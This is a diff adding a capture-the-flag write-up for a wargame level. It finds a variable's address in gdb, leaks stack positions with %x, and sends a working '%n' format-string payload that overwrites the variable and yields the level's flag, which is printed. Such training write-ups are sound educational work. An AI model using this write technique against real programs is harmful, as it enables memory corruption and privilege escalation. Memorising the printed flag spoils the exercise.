@@ -1,0 +1,41 @@
+# Same as level3 but now the wanted value is 16930116
+# We can't print as much bytes because of the size of buffer (512)
+# That's why we'll use a printf modifier (%numberType) to print as much bytes we need
+# First we'll get the address of m thanks to gdb
+
+gdb ~/level4
+info variables
+...
+0x080497fc  data_start
+0x08049800  __dso_handle
+0x08049804  stdin@@GLIBC_2.0
+0x08049808  completed.6159
+0x0804980c  dtor_idx.6161
+0x08049810  m
+
+# The address of m is 0x08049810
+# Let's find the buffer address in the stack thanks to printf
+
+level4@RainFall:~$ ./level4
+AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+AAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
+
+# We can see that our address is on the 12th position, now we know that let's take the same idea of level3
+# But we have to put more bytes between the address and the %n, to do that we'll use the identifier % of printf
+# This modifier allows us to put as many blank space as we need for our buffer, it'll be used like that: %[numberOfBytesToWrite]d
+# Our buffer will be then: "\x10\x98\x04\x08" + "%16930112d%12$n"
+# Let's try this
+
+(python -c 'print("\x10\x98\x04\x08" + "%16930112d%12$n")'; cat -) | ~/level4
+        ...
+
+
+
+
+
+
+        ...
+-1208015184
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+# Ouf flag is 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
